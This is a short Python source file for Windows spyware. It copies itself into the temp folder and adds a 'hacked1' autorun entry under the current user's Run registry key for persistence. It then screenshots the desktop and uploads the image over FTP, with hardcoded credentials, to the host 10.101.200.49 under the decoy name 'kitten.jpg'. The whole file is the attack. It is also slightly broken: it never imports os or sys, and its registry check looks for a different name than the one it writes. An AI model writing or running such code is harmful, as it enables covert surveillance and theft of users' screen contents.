import pyautogui
import ftplib
from _winreg import *




def autorun(tempdir, fileName, run):
# Copy executable to %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))

# Queries Windows registry for the autorun key value
# Stores the key values in runkey array
    key = OpenKey(HKEY_CURRENT_USER, run)
    runkey =[]
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass

# If the autorun key "hacked" isn't set this will set the key:
    if 'hacked' not in runkey:
        try:
            key= OpenKey(HKEY_CURRENT_USER, run,0,KEY_ALL_ACCESS)
            SetValueEx(key ,'hacked1',0,REG_SZ,r"%TEMP%\sentFTP.exe")
            key.Close()
        except WindowsError:
            pass

def dataSent():
    # Take screenshot
    pic = pyautogui.screenshot()     
    # Save the image
    pic.save('Screenshot.png') 


    session = ftplib.FTP('10.101.200.49','root','toor123')
    file = open('Screenshot.png','rb')              # file to send
    session.storbinary('STOR kitten.jpg', file)     # send the file
    file.close()                                    # close file and FTP
    session.quit()


def main():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]
    run = "Software\Microsoft\Windows\CurrentVersion\Run"
    autorun(tempdir, fileName, run)
    dataSent()

if __name__ == "__main__":
        main()

